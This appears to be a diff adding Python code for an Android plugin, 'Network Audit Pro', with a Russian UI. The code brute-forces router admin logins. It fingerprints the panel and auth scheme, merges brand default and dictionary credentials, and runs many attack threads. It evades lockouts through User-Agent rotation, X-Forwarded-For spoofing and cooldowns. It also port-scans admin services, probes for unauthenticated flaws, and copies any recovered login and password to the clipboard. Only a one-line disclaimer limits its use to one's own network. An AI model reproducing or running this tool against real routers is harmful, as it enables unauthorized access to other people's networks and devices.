+        self.refresh()
+
+    # ------------------- Запуск / остановка -------------------
+
+    def _run_recon(self):
+        status_code, location, _, body, full_text = self.http_request(
+            self.gateway, self.port, "GET", "/", None, None, float(self.timeout_seconds), evade=False
+        )
+        # классика nginx-роутеров: HTTP-порт отдаёт только 302 на https://host/.
+        # Один раз переезжаем на 443 и пересобираем разведку по TLS
+        if status_code in (301, 302) and str(location or "").lower().startswith("https://") and self.port != 443:
+            loc_host = ""
+            try:
+                loc_host = urllib.parse.urlsplit(location).hostname or ""
+            except Exception:
+                loc_host = ""
+            if loc_host in ("", self.gateway):
+                self.port = 443
+                self.set_setting("port", 443)
+                self._log("Панель отвечает только по HTTPS (302 на https://{}). Переключился на 443 (TLS).".format(loc_host or self.gateway), "SCAN")
+                self.refresh()
+                return self._run_recon()
+        if status_code <= 0:
+            return False
+        # LuCI отдаёт посадочную с <meta http-equiv=refresh url=cgi-bin/luci/>:
+        # один переход по внутреннему target — там уже панель/логин
+        meta_m = None
+        try:
+            meta_m = re.search(
+                r'(?i)http-equiv\s*=\s*["\']?refresh["\']?[^>]*?url\s*=\s*["\']?([^"\'>\s;]+)',
+                full_text or ""
+            )
+        except Exception:
+            meta_m = None
+        if meta_m:
+            target = meta_m.group(1)
+            if not target.lower().startswith("http"):
+                target = "/" + target.lstrip("/").lstrip()
+                try:
+                    _s2, _l2, _ck2, _b2, full_text = self.http_request(
+                        self.gateway, self.port, "GET", target, None, None, float(self.timeout_seconds), evade=False
+                    )
+                    self._log("Мета-редирект посадочной: панель, вероятно, на {}".format(target), "SCAN")
+                except Exception:
+                    pass
+        self.panel_title = self.parse_title(full_text)
+        self.brand_hint = self.detect_brand_from_page(
+            self.panel_title,
+            self.extract_server_header(full_text),
+            full_text.lower()
+        )
+        realm_raw = self.extract_realm(full_text)
+        www_header = self.extract_www_authenticate(full_text)
+        # сбрасываем прошлое состояние: без свежего 401 схема остаётся Basic
+        self.auth_scheme = "basic"
+        self.digest_params = None
+        self.auth_realm = ""
+        if www_header.lower().startswith("digest"):
+            self.auth_scheme = "digest"
+            self.digest_params = parse_digest_challenge(www_header)
+            self.auth_realm = self.digest_params.get("realm", "")
+            self._log("Защита Digest Auth (MD5), Realm: {}".format(self.auth_realm), "SCAN")
+        elif realm_raw:
+            self.auth_scheme = "basic"
+            self.digest_params = None
+            self.auth_realm = realm_raw
+            self._log("Защита Basic Auth, Realm: {}".format(realm_raw), "SCAN")
+        action = self.find_form_action(full_text)
+        if action:
+            self._log("Найдена HTML-форма входа: POST {}".format(action), "SCAN")
+        self._log("Панель определена как {}. Title: {}".format(self.brand_hint, (self.panel_title or "-")[:60]), "SCAN")
+        self._detected_form_action = action
+        # динамические имена полей конкретно этого роутера
+        fields = extract_form_fields(full_text)
+        self._form_fields = fields if fields[1] else None
+        return True
+
+    def _merge_priority_pairs(self, pairs, candidates):
+        existing = set(candidates)
+        addition = [pair for pair in pairs if pair not in existing]
+        return addition + candidates
+
+    def _auto_detect_gateway_now(self):
+        ip = self._detect_local_ip_cached()
+        if not ip or ip.count(".") != 3:
+            self.toast("❌ Не удалось определить ваш IP")
+            return
+        guessed = ".".join(ip.split(".")[:-1]) + ".1"
+        self.gateway = guessed
+        self.set_setting("gateway", self.gateway)
+        self._log("Шлюз автоопределён: {}".format(guessed), "OK")
+        self.toast("🎯 Шлюз: {}".format(guessed))
+        self.refresh()
+
+    def _run_passhunt(self):
+        if self.running:
+            self._stop_passhunt()
+            return
+
+        # новый прогон: старые воркеры (могут висеть в socket-таймауте до ~2*timeout)
+        # увидят смену поколения и выйдут, не трогая общий курсор нового запуска
+        self._run_gen = getattr(self, "_run_gen", 0) + 1
+
+        gateway_clean = str(self.gateway or "").strip()
+        if not gateway_clean or "." not in gateway_clean or gateway_clean.startswith("198.18."):
+            self.toast("❌ Укажите корректный IP шлюза (без VPN Fake-IP)")
+            return
+
+        if self._detect_vpn():
+            self._log("⚠️ Обнаружен VPN: шлюз может быть неверным и атаки могут идти мимо роутера", "WARN")
+            self.toast("🛡 Внимание: активен VPN!")
+
+        self.running = True
+        self.stop_flag = False
+        self.found_flag = False
+        self.brute_done = False
+        for old_thread in self.threads:
+            if old_thread.is_alive():
+                try:
+                    old_thread.join(timeout=1.0)
+                except Exception:
+                    pass
+        self.found_creds = None
+        self.tried_count = 0
+        self.fail_count = 0
+        self.lockout_count = 0
+        self.evade_pauses = 0
+        self.pps = 0
+        self._consec_lockouts = 0
+        self._cooldown_until = 0.0
+        self.status_line = "Разведка панели..."
+        self.refresh()
+
+        probe_ok = self._run_recon()
+        if not probe_ok:
+            self._log("Нет связи с {}:{}.".format(self.gateway, self.port), "ERR")
+            self.status_line = "Нет связи с целью."
+            self.running = False
+            self.refresh()
+            self.toast("❌ Роутер не отвечает на {}:{}".format(self.gateway, self.port))
+            return
+
+        candidates = self._build_candidates()
+
+        realm_pairs = self.fetch_realms_dictionary(self.auth_realm) if self.auth_realm else []
+        if realm_pairs:
+            candidates = self._merge_priority_pairs(realm_pairs, candidates)
+
+        brand_pairs = BRAND_CREDS.get(self.brand_hint, [])
+        if brand_pairs:
+            candidates = self._merge_priority_pairs(brand_pairs, candidates)
+
+        form_path = getattr(self, "_detected_form_action", "") or ""
+        if not form_path and self.brand_hint in BRAND_LOGIN_PATHS:
+            form_path = BRAND_LOGIN_PATHS[self.brand_hint][0]
+        if not form_path:
+            form_path = "/"
+
+        with self.stats_lock:
+            self._cursor = 0
+
+        self.expected_total = len(candidates)
+        self._brute_started_ts = time.time()
+        self.last_run_summary = None
+        imported_count = self._imported_pairs_count
+        default_count = len(default_dict_pairs())
+        evade_info = "UA-ротация: {}, задержка {} мс, кулдаун {} с".format(
+            "вкл" if self.evasion_ua else "выкл",
+            self.attempt_delay_ms,
+            self.lockout_pause_s,
+        )
+        self._log("Атака {}:{} · режим {} · потоки {} · {} комбинаций (встроенный словарь: {}, свой: {}) · {}".format(
+            self.gateway, self.port, self.mode, self.num_threads,
+            len(candidates), default_count, imported_count, evade_info
+        ), "BRUTE")
+        self.status_line = "Перебор идёт..."
+
+        self.threads = []
+        threading.Thread(target=self._ui_progress_timer, daemon=True).start()
+
+        threads_to_start = max(1, min(int(self.num_threads), 32))
+        for i in range(threads_to_start):
+            try:
+                t = threading.Thread(
+                    target=self.worker_loop,
+                    args=(i, candidates, self.mode, form_path),
+                    daemon=True
+                )
+                t.start()
+                self.threads.append(t)
+            except Exception as err:
+                self._log("Ошибка создания потока: {}".format(err), "ERR")
+                break
+
+        self.refresh()
+
+    def _stop_passhunt(self):
+        if not self.running:
+            return
+        self.stop_flag = True
+        self.running = False
+        self.status_line = "Остановлено пользователем."
+        self._finalize_run_summary("stopped")
+        self._log("⏹ Стоп. Попыток сделано: {}".format(self.tried_count), "INFO")
+        self.toast("Останавливаю перебор и ищу уязвимости...")
+        threading.Thread(target=self.probe_vulnerabilities, daemon=True).start()
+        self.refresh()
+
+    # ------------------- Отчёт -------------------
+
+    def _export_report(self):
+        lines = [
+            "📋 === ОТЧЁТ Network Audit Pro v{} ===".format(__version__),
+            "Автор: {}".format(__author__),
+            "Цель: {}:{} · режим {} · потоки {} · таймаут {}с".format(
+                self.gateway, self.port, self.mode, self.num_threads, self.timeout_seconds
+            ),
+            "Обход детекта: UA-ротация {}, XFF {}, базовая задержка {} мс, кулдаун {} с (пауз за прогон: {})".format(
+                "вкл" if self.evasion_ua else "выкл",
+                "вкл" if self.evasion_xff else "выкл",
+                self.attempt_delay_ms,
+                self.lockout_pause_s,
+                self.evade_pauses,
+            ),
+            "--- Панель ---",
+            "Определённый бренд: {}".format(self.brand_hint or "-"),
+            "Title страницы: {}".format(self.panel_title or "-"),
+            "Basic realm: {}".format(self.auth_realm or "-"),
+            "--- Итог проверки доступа ---"
+        ]
+        if self.found_creds:
+            u, p, m = self.found_creds
+            lines.append("✅ ДОСТУП ПОЛУЧЕН")
+            lines.append("Логин:  {}".format(u if u else "(пусто)"))
+            lines.append("Пароль: {}".format(p if p else "(пусто)"))
+            lines.append("Способ: {}".format(AUTH_MODE_LABELS.get(m, "HTML-форма POST")))
+        elif self.tried_count > 0:
+            lines.append("❌ Пароль не подобран за {} попыток".format(self.tried_count))
+        else:
+            lines.append("ℹ️ Перебор ещё не выполнялся")
+        lines.append("Статистика: попыток {} · неудач {} · блокировок {}".format(
+            self.tried_count, self.fail_count, self.lockout_count
+        ))
+        imported_pairs_count = self._imported_pairs_count
+        lines.append("Свой словарь: {} пар".format(imported_pairs_count))
+        lines.append("--- Уязвимости без пароля ---")
+        if self.vulns_found:
+            for item in self.vulns_found:
+                lines.append("• {}".format(item))
+        else:
+            lines.append("• Не обнаружены или цель закрыта фильтром")
+        lines.append("=" * 48)
+        self.generated_report_text = "\n".join(lines)
+
+        saved_path = ""
+        try:
+            stamp = time.strftime("%Y%m%d_%H%M%S")
+            saved_path = "/sdcard/Download/net_audit_report_{}.txt".format(stamp)
+            with open(saved_path, "w", encoding="utf-8") as f:
+                f.write(self.generated_report_text)
+            self._log("Отчёт сохранён в Download", "OK")
+        except Exception as exc:
+            self._log("Не удалось сохранить файл: {}".format(exc), "ERR")
+
+        copied = self._copy_text_to_clipboard(self.generated_report_text)
+        if copied:
+            self._log("Отчёт скопирован в буфер обмена", "OK")
+
+        self.toast("📤 Отчёт готов{}".format("" if copied else " (буфер недоступен)"))
+        self.navigate("report")
+        self.refresh()
+
+    def _copy_text_to_clipboard(self, text):
+        try:
+            from com.chaquo.python import Python
+            from android.content import Context, ClipData
+            app_context = Python.getPlatform().getApplication()
+            clipboard = app_context.getSystemService(Context.CLIPBOARD_SERVICE)
+            clip = ClipData.newPlainText("Network Audit Pro", str(text or ""))
+            clipboard.setPrimaryClip(clip)
+            return True
+        except Exception:
+            return False
+
+    def _copy_credentials(self):
+        if not self.found_creds:
+            self.toast("Нет найденного доступа")
+            return
+        u, p, _m = self.found_creds
+        ok = self._copy_text_to_clipboard("{}:{}".format(u, p))
+        self.toast("🔑 Логин:пароль в буфере" if ok else "Буфер недоступен")
+
+    # ------------------- Диагностика сети -------------------
+
+    def _test_ping(self):
+        gateway_clean = str(self.gateway or "").strip()
+        if not gateway_clean or "." not in gateway_clean:
+            self.toast("❌ Задайте корректный IP")
+            return
+        self.status_line = "Проверяю связь..."
+        self.refresh()
+
+        def ping_worker():
+            try:
+                started = time.time()
+                s = socket.create_connection((gateway_clean, self.port), timeout=float(min(self.timeout_seconds, 5)))
+                if self.port in (23, 21, 22, 443):
+                    # для Telnet/FTP/SSH/443 bare TCP-connect — HTTP GET им не по адресу
+                    elapsed = round((time.time() - started) * 1000, 1)
+                    self._safe_close_socket(s)
+                    self.ping_status_text = "✅ Отвечает за {} ms (TCP)".format(elapsed)
+                    self._log("Шлюз {}:{} доступен ({} ms, TCP без запроса)".format(gateway_clean, self.port, elapsed), "OK")
+                    self.refresh()
+                    return
+                s.sendall(b"GET / HTTP/1.1\r\nHost: probe\r\nConnection: close\r\n\r\n")
+                s.recv(256)
+                elapsed = round((time.time() - started) * 1000, 1)
+                self._safe_close_socket(s)
+                self.ping_status_text = "✅ Отвечает за {} ms".format(elapsed)
+                self._log("Шлюз {}:{} доступен ({} ms)".format(gateway_clean, self.port, elapsed), "OK")
+            except Exception as exc:
+                self.ping_status_text = "❌ Нет ответа: {}".format(exc)
+                self._log("Цель {}:{} недоступна: {}".format(gateway_clean, self.port, exc), "ERR")
+            self.refresh()
+
+        threading.Thread(target=ping_worker, daemon=True).start()
+
+    def _run_port_scan(self):
+        self.scan_results_txt = "Сканирую порты..."
+        self.refresh()
+
+        def scan_worker():
+            opened = []
+            for port_num, service_name in ADMIN_PORTS:
+                if self.stop_flag:
+                    break
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1.0)
+                    res = s.connect_ex((self.gateway, port_num))
+                    self._safe_close_socket(s)
+                    if res == 0:
+                        opened.append((port_num, service_name))
+                except Exception:
+                    pass
+            if opened:
+                shown = ", ".join(["{} ({})".format(port_num, service_name) for port_num, service_name in opened])
+                self.scan_results_txt = "Открытые порты: " + shown + (" (443: TLS не проверяется)" if 443 in opened else "")
+                self._log("Открытые порты шлюза: {}".format(shown), "OK")
+                if self.port not in [p for p, _ in opened]:
+                    # автопереключение только на HTTP-семейство; Telnet/FTP/443(TLS) не годятся
+                    http_ports = [p for p, name in opened if name in ("HTTP", "Web-Alt")]
+                    if http_ports:
+                        self.port = http_ports[0]
+                        self.set_setting("port", self.port)
+                        self._log("Основной порт переключён на {}".format(self.port), "OK")
+            else:
+                self.scan_results_txt = "Открытых TCP-портов не найдено"
+                self._log("Сканер портов: ничего открыто", "WARN")
+            self.refresh()
+
+        threading.Thread(target=scan_worker, daemon=True).start()
+
+    def _detect_local_ip_cached(self):
+        now = time.time()
+        if self._cached_ip and (now - self._cached_ip_time) < 15.0:
+            return self._cached_ip
+        ip = ""
+        try:
+            device_json = self.api.getDevice()
+            data = json.loads(str(device_json)) if isinstance(device_json, str) else device_json
+            if isinstance(data, dict):
+                wifi_info = data.get("wifi", {}) or {}
+                raw_ip = wifi_info.get("ip") or wifi_info.get("address")
+                if isinstance(raw_ip, str) and raw_ip.strip() and raw_ip.strip() not in ("—", "-", "null", "None"):
+                    ip = raw_ip.strip()
+        except Exception:
+            ip = ""
+        if not ip or ip == "127.0.0.1":
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.settimeout(0.4)
+                s.connect(("8.8.8.8", 80))
+                ip = s.getsockname()[0]
+                self._safe_close_socket(s)
+            except Exception:
+                ip = ""
+        self._cached_ip = ip
+        self._cached_ip_time = now
+        return ip
+
+    def _init_auto_gateway(self):
+        ip = self._detect_local_ip_cached()
+        if ip and ip.count(".") == 3 and not ip.startswith("198.18.") and ip != "127.0.0.1":
+            guessed = ".".join(ip.split(".")[:-1]) + ".1"
+            if not self.gateway:
+                self.gateway = guessed
+                self.set_setting("gateway", self.gateway)
+                self._log("Шлюз автоопределён по вашему IP: {}".format(guessed), "OK")
+
+    def _detect_wifi_connected(self):
+        ip = self._detect_local_ip_cached()
+        if not ip or ip == "127.0.0.1":
+            return False
+        return (
+            ip.startswith("192.168.") or ip.startswith("10.")
+            or ip.startswith("172.16.") or ip.startswith("172.17.")
+            or ip.startswith("172.18.") or ip.startswith("172.19.")
+            or ip.startswith("172.20.") or ip.startswith("172.21.")
+            or ip.startswith("172.22.") or ip.startswith("172.23.")
+            or ip.startswith("172.24.") or ip.startswith("172.25.")
+            or ip.startswith("172.26.") or ip.startswith("172.27.")
+            or ip.startswith("172.28.") or ip.startswith("172.29.")
+            or ip.startswith("172.30.") or ip.startswith("172.31.")
+        )
+
+    def _recheck_panel(self):
+        def recon_worker():
+            try:
+                ok = self._run_recon()
+                if not ok:
+                    self._log("Разведка не удалась: цель не отвечает", "ERR")
+            except Exception as err:
+                self._log("Ошибка разведки: {}".format(err), "ERR")
+            self.refresh()
+
+        threading.Thread(target=recon_worker, daemon=True).start()
+        self.toast("🧠 Заново определяю панель...")
+
+    # ------------------- Сеттеры UI -------------------
+
+    def _set_gateway(self, value):
+        val = str(value or "").strip()
+        if val:
+            self.gateway = val
+            self.set_setting("gateway", self.gateway)
+
+    def _safe_int(self, value, default, minimum, maximum):
+        try:
+            return max(minimum, min(maximum, int(float(str(value).strip()))))
+        except Exception:
+            return default
+
+    def _set_port(self, value):
+        p = self._safe_int(value, 0, 1, 65535)
+        if p:
+            self.port = p
+            self.set_setting("port", self.port)
+
+    def _set_mode(self, new_mode):
+        self.mode = new_mode
+        self.set_setting("mode", new_mode)
+        self.refresh()
+
+    def _set_threads(self, value):
+        self.num_threads = self._safe_int(value, self.num_threads, 1, 32)
+        self.set_setting("num_threads", self.num_threads)
+        self.refresh()
+
+    def _set_timeout(self, value):
+        self.timeout_seconds = self._safe_int(value, self.timeout_seconds, 1, 10)
+        self.set_setting("timeout_seconds", self.timeout_seconds)
+        self.refresh()
+
+    def _set_stop_on_success(self, value):
+        self.stop_on_success = bool(value)
+        self.set_setting("stop_on_success", self.stop_on_success)
+        self.refresh()
+
+    def _set_evasion_ua(self, value):
+        self.evasion_ua = bool(value)
+        self.set_setting("evasion_ua", self.evasion_ua)
+        self.refresh()
+
+    def _set_evasion_xff(self, value):
+        self.evasion_xff = bool(value)
+        self.set_setting("evasion_xff", self.evasion_xff)
+        self.refresh()
+
+    def _set_attempt_delay(self, value):
+        self.attempt_delay_ms = self._safe_int(value, self.attempt_delay_ms, 0, 2000)
+        self.set_setting("attempt_delay_ms", self.attempt_delay_ms)
+        self.refresh()
+
+    def _set_lockout_pause(self, value):
+        self.lockout_pause_s = self._safe_int(value, self.lockout_pause_s, 0, 120)
+        self.set_setting("lockout_pause_s", self.lockout_pause_s)
+        self.refresh()
+
+    def _set_custom_users(self, value):
+        self.custom_users_text = str(value or "")
+        self.set_setting("custom_users", self.custom_users_text)
+
+    def _set_custom_passes(self, value):
+        self.custom_passes_text = str(value or "")
+        self.set_setting("custom_passes", self.custom_passes_text)
+
+    def _dict_preview_pairs(self, text):
+        # парсим только при смене текста, не на каждом рендере экрана
+        text_key = str(text or "")
+        cache = getattr(self, "_preview_cache", None)
+        if cache is not None and (cache[0] is text_key or cache[0] == text_key):
+            return cache[1]
+        pairs = self._parse_dict_pairs(text_key)
+        self._preview_cache = (text_key, pairs)
+        return pairs
+
+    def _recount_dict_pairs(self):
+        # финальный подсчёт после паузы в наборе текста (дебаунс)
+        try:
+            self._imported_pairs_count = len(self._parse_dict_pairs(self.custom_dict_text))
+            self._preview_cache = None
+            self.refresh()
+        except Exception:
+            pass
+
+    def _cancel_dict_parse_timer(self):
+        timer = getattr(self, "_dict_parse_timer", None)
+        if timer is not None:
+            try:
+                timer.cancel()
+            except Exception:
+                pass
+            self._dict_parse_timer = None
+
+    def _set_custom_dict_text(self, value):
+        self.custom_dict_text = str(value or "")
+        self._preview_cache = None
+        self.set_setting("custom_dict_text", self.custom_dict_text)
+        self._cancel_dict_parse_timer()
+        # не парсим 1 МБ на каждую нажатую клавишу — пересчитаем после паузы
+        self._dict_parse_timer = threading.Timer(0.8, self._recount_dict_pairs)
+        self._dict_parse_timer.daemon = True
+        self._dict_parse_timer.start()
+
+    def _set_manual_dict_path(self, value):
+        self.manual_dict_path = str(value or "")
+        self.set_setting("manual_dict_path", self.manual_dict_path)
+
+    def _refresh_file_list(self):
+        self._dict_scan_cache = ()
+        self.toast("🔄 Пересканирую память...")
+        self.refresh()
+
+    def on_plugin_unload(self):
+        # смена поколения будит воркеров, зависших в socket-чтении
+        self._run_gen = getattr(self, "_run_gen", 0) + 1
+        self.stop_flag = True
+        self.running = False
+        self._cancel_dict_parse_timer()
+
+    # ------------------- Экраны UI -------------------
+
+    def screen_main(self, ui, api, state):
+        wifi_ok = self._detect_wifi_connected()
+        vpn_ok = self._detect_vpn()
+        imported_count = self._imported_pairs_count
+
+        children = []
+
+        my_ip = self._detect_local_ip_cached() or "-"
+        children.append(ui.card([
+            ui.row([
+                ui.icon("wifi", 34, tint="success" if wifi_ok else "warning"),
+                ui.column([
+                    ui.text("Wi-Fi подключён" if wifi_ok else "Проверьте Wi-Fi/LAN", "titleLarge"),
+                    ui.text("Ваш IP: {} · Шлюз: {} · Порт: {}".format(
+                        my_ip, self.gateway or "-", self.port
+                    ), "bodyMedium"),
+                ], spacing=2),
+            ], spacing=12),
+            ui.row(
+                ([ui.chip("🛡 VPN активен", True)] if vpn_ok else []) + [
+                    ui.chip("Встроенный: {} пар".format(len(default_dict_pairs())), False),
+                    ui.chip("Свой: {} пар".format(imported_count), False),
+                    ui.chip("v{}".format(__version__), False),
+                ],
+                spacing=6,
+            ),
+        ]))
+
+        children.append(ui.card(ui.column([
+            ui.row([
+                ui.text("🎯 Цель атаки", "titleSmall"),
+                ui.button("Настройки", on_click=lambda: self.navigate("attack_settings"), style="text")
+            ], fill_max_width=True),
+            ui.row([
+                ui.text_field(
+                    value=str(self.gateway),
+                    on_change=lambda v: self._set_gateway(v),
+                    label="IP шлюза (роутера)",
+                    single_line=True,
+                    fill_max_width=True
+                ),
+                ui.button("🎯 Авто-IP", on_click=self._auto_detect_gateway_now, style="outlined")
+            ], fill_max_width=True),
+            ui.row([
+                ui.button("⚡ Пинг", on_click=self._test_ping, style="outlined"),
+                ui.button("🔍 Порты", on_click=self._run_port_scan, style="outlined"),
+                ui.button("♻️ Разведка", on_click=self._recheck_panel, style="outlined")
+            ], spacing=8, fill_max_width=True),
+            ui.text(self.ping_status_text, "bodySmall"),
+            ui.text(self.scan_results_txt, "bodySmall"),
+            ui.text("Бренд: {} · Realm: {} · Защита: {}".format(
+                self.brand_hint or "не определён",
+                self.auth_realm or "-",
+                "Digest" if self.auth_scheme == "digest" else "Basic/форма"
+            ), "bodySmall")
+        ], spacing=6)))
+
+        children.append(ui.card(ui.column([
+            ui.row([
+                ui.text("🔤 Словари", "titleSmall"),
+                ui.button("Выбрать", on_click=self._open_dict_screen, style="text")
+            ], fill_max_width=True),
+            ui.text("Встроенный словарь: {} пар · Свой словарь: {} пар".format(
+                len(default_dict_pairs()), imported_count
+            ), "bodyMedium")
+        ], spacing=4)))
+
+        children.append(ui.card(ui.row([
+            ui.column([
+                ui.text("⚙️ Атака", "titleMedium"),
+                ui.text("{} · потоков {} · задержка {} мс · стоп-на-успех: {}".format(
+                    {"auto": "Auto", "basic": "Basic", "form": "Форма"}.get(self.mode, self.mode),
+                    self.num_threads, self.attempt_delay_ms,
+                    "вкл" if self.stop_on_success else "выкл"
+                ), "bodyMedium"),
+            ], spacing=2),
+            ui.button("Настроить", on_click=lambda: self.navigate("attack_settings"), style="tonal")
+        ], fill_max_width=True)))
+
+        control_children = [
+            ui.button(
+                "🚀 Запустить атаку" if not self.running else "⏹ Остановить",
+                on_click=self._run_passhunt,
+                style="filled" if not self.running else "error",
+                fill_max_width=True
+            ),
+            ui.button("🔓 Только уязвимости", on_click=self._probe_vulns_button, style="tonal", fill_max_width=True),
+            ui.button("💥 Супер взлом", on_click=self._super_hack_button, style="outlined", fill_max_width=True),
+            ui.row([
+                ui.button("📤 Отчёт", on_click=self._export_report, style="text", fill_max_width=True),
+                ui.button("📝 Журнал", on_click=self._open_logs_screen, style="text", fill_max_width=True),
+            ], spacing=8, fill_max_width=True)
+        ]
+        children.append(ui.card(ui.column(control_children, spacing=6)))
+
+        # Плашка результата / живая скорость
+        progress_card = []
+        if self.running:
+            percent_done = 0
+            if self.expected_total > 0:
+                percent_done = min(100, int(self.tried_count * 100 / self.expected_total))
+            elapsed_min = max(0, int((time.time() - getattr(self, "_brute_started_ts", time.time())) // 60))
+            eta_line = ""
+            remaining = max(0, self.expected_total - self.tried_count)
+            if self.pps > 0 and remaining > 0:
+                eta_sec = int(remaining / self.pps)
+                if eta_sec >= 90:
+                    eta_line = " · осталось ~{} мин".format(max(1, eta_sec // 60))
+                else:
+                    eta_line = " · осталось ~{} сек".format(eta_sec)
+            progress_card.extend([
+                ui.row([
+                    ui.icon("bolt", 30, tint="primary"),
+                    ui.column([
+                        ui.text("Атака идёт", "titleLarge"),
+                        ui.text("⚡ {} попыток/сек · {} мин{}".format(self.pps, elapsed_min, eta_line), "titleSmall", color="primary"),
+                    ], spacing=2),
+                ], spacing=12),
+                ui.linear_progress(progress=(float(self.tried_count) / self.expected_total) if self.expected_total > 0 else None),
+                ui.text("{}/{} ({}%) · Неудач: {} · Блокировок: {}".format(
+                    self.tried_count, self.expected_total, percent_done, self.fail_count, self.lockout_count
+                ), "bodyMedium"),
+                ui.text(self.status_line, "bodySmall"),
+            ])
+        elif self.found_creds:
+            found_user, found_pass, found_mode = self.found_creds
+            summary = self.last_run_summary or {}
+            creds_value = "{} / {}".format(found_user if found_user else "(пусто)", found_pass if found_pass else "(пусто)")
+            progress_card.extend([
+                ui.row([
+                    ui.icon("check_circle", 34, tint="success"),
+                    ui.column([
+                        ui.text("ДОСТУП ПОЛУЧЕН", "headlineSmall", color="success"),
+                        ui.text("Логин / Пароль", "bodySmall"),
+                        ui.text(creds_value, "headlineMedium"),
+                        ui.text("Способ: {} · Попыток: {}".format(
+                            AUTH_MODE_LABELS.get(found_mode, "HTML-форма POST"),
+                            summary.get("attempts", self.tried_count)
+                        ), "bodyMedium"),
+                        *( [ui.text("⏱ {} сек · средняя скорость {} попыток/сек".format(
+                              summary.get("duration_s", "?"), summary.get("avg_pps", 0)
+                          ), "bodySmall")] if summary else [] )
+                    ], spacing=2),
+                ], spacing=12),
+                ui.row([
+                    ui.button("🔑 Копировать пароль", on_click=self._copy_credentials, style="tonal", fill_max_width=True),
+                    ui.button("📥 Отчёт", on_click=self._export_report, style="outlined", fill_max_width=True),
+                ], spacing=8, fill_max_width=True),
+            ])
+        elif self.tried_count > 0:
+            summary = self.last_run_summary or {}
+            progress_card.extend([
+                ui.row([
+                    ui.icon("block", 34, tint="error"),
+                    ui.column([
+                        ui.text("НЕУДАЧА", "headlineSmall", color="error"),
+                        ui.text("Перепробовано {} комбинаций, пароль не подошёл.".format(self.tried_count), "bodyMedium"),
+                        *( [ui.text("⏱ {} сек · средняя скорость {} попыток/сек".format(
+                              summary.get("duration_s", "?"), summary.get("avg_pps", 0)
+                          ), "bodySmall")] if summary else [] )
+                    ], spacing=2),
+                ], spacing=12),
+                ui.button("🔓 Искать уязвимости", on_click=self._probe_vulns_button, style="tonal", fill_max_width=True),
+            ])
+        else:
+            progress_card.extend([
+                ui.row([
+                    ui.icon("shield", 30),
+                    ui.column([
+                        ui.text("Статус", "titleLarge"),
+                        ui.text(self.status_line, "bodyMedium"),
+                    ], spacing=2),
+                ], spacing=12),
+            ])
+        children.append(ui.card(ui.column(progress_card, spacing=8)))
+
+        log_preview = "\n".join(self.logs[-6:]) if self.logs else "Журнал пуст."
+        children.append(ui.card(ui.column([
+            ui.row([
+                ui.text("📜 Последние события", "titleSmall"),
+                ui.button("Все", on_click=self._open_logs_screen, style="text"),
+                ui.button("Очистить", on_click=self._clear_logs, style="text")
+            ], fill_max_width=True),
+            ui.log_panel(log_preview, max_height=140)
+        ], spacing=4)))
+
+        if self.vulns_found:
+            vuln_items = [ui.text("🔓 Открыто без пароля: {}".format(len(self.vulns_found)), "titleSmall")]
+            for item in self.vulns_found[:8]:
+                vuln_items.append(ui.settings_row(item, "открыто без логина", "lock_open"))
+            children.append(ui.card(vuln_items))
+
+        children.append(ui.card([
+            ui.text("⚠️ Только для аудита собственных сетей.", "bodySmall")
+        ]))
+
+        return ui.scaffold(
+            title="Network Audit Pro",
+            actions=[
+                ui.top_action("help", lambda: self.navigate("guide")),
+                ui.top_action("folder", lambda: self.navigate("dict"))
+            ],
+            content=ui.lazy_column(children=children, padding=16, spacing=12)
+        )
+
+    def _open_guide_screen(self):
+        self.navigate("guide")
+
+    def _open_logs_screen(self):
+        self.navigate("logs")
+
+    def _open_dict_screen(self):
+        self.navigate("dict")
+
+    def _super_hack_button(self):
+        self.navigate("hack_confirm")
+        self.refresh()
+
+    def _super_hack_cancel(self):
+        self.navigate("main")
+        self.refresh()
+
+    def _super_hack_go(self):
+        self._log("💥 Супер взлом активирован", "HIT")
+        self.navigate("rickroll")
+        self.refresh()
+
+    def screen_hack_confirm(self, ui, api, state):
+        # обычный экран вместо alert_dialog: Dolphy рисует его мгновенно
+        return ui.scaffold(
+            title="💥 Супер взлом",
+            show_back=True,
+            content=ui.column([
+                ui.card([
+                    ui.icon("warning", 44, tint="warning"),
+                    ui.text("Экстремальный режим", "headlineSmall"),
+                    ui.text(
+                        "Попытка взлома ЛЮБОГО роутера одной кнопкой.\n"
+                        "Очень опасно: роутер может запомнить вас в лицо!\n"
+                        "Настоятельно рекомендуем включить VPN.",
+                        "bodyLarge"
+                    ),
+                ]),
+                ui.button("💥 Взломать!", on_click=self._super_hack_go, style="error", fill_max_width=True),
+                ui.button("⬅️ Отмена", on_click=self._super_hack_cancel, style="text", fill_max_width=True),
+            ], padding=16, spacing=12, fill_max_size=True)
+        )
+
+    def screen_rickroll(self, ui, api, state):
+        # как в usb_c_ir_backend: fullscreen webview, обычная watch-ссылка
+        return ui.scaffold(
+            title="💥 Супер взлом",
+            content=ui.column(
+                [ui.webview(url="https://www.youtube.com/watch?v=dQw4w9WgXcQ", fill_max_size=True)],
+                padding=0,
+                spacing=0,
+                fill_max_size=True,
+            ),
+        )
+
+    def _probe_vulns_button(self):
+        self.toast("🔓 Ищу незакрытые пути...")
+        threading.Thread(target=self.probe_vulnerabilities, daemon=True).start()
+
+    def screen_attack_settings(self, ui, api, state):
+        children = [
+            ui.card(ui.column([
+                ui.text("Режим подбора", "titleMedium"),
+                ui.button_group(
+                    [["auto", "Auto"], ["basic", "Basic"], ["form", "Форма"]],
+                    self.mode,
+                    lambda v: self._set_mode(str(v)),
+                ),
+                ui.slider(
+                    value=float(self.num_threads),
+                    on_change=lambda v: self._set_threads(int(v)),
+                    minimum=1,
+                    maximum=32,
+                    title="Количество потоков: {}".format(self.num_threads),
+                    steps=31
+                ),
+                ui.slider(
+                    value=float(self.timeout_seconds),
+                    on_change=lambda v: self._set_timeout(int(v)),
+                    minimum=1,
+                    maximum=10,
+                    title="Таймаут соединения: {} с".format(self.timeout_seconds),
+                    steps=9
+                ),
+                ui.text_field(
+                    value=str(self.port),
+                    on_change=lambda v: self._set_port(v),
+                    label="Порт",
+                    single_line=True,
+                    fill_max_width=True
+                ),
+                ui.switch(
+                    checked=self.stop_on_success,
+                    on_change=lambda v: self._set_stop_on_success(v),
+                    title="⛔ Стоп после первого успеха",
+                    subtitle="Не продолжать после найденного пароля"
+                ),
+            ], spacing=8)),
+            ui.card(ui.column([
+                ui.text("🥷 Обход блокировок (anti-detect)", "titleMedium"),
+                ui.switch(
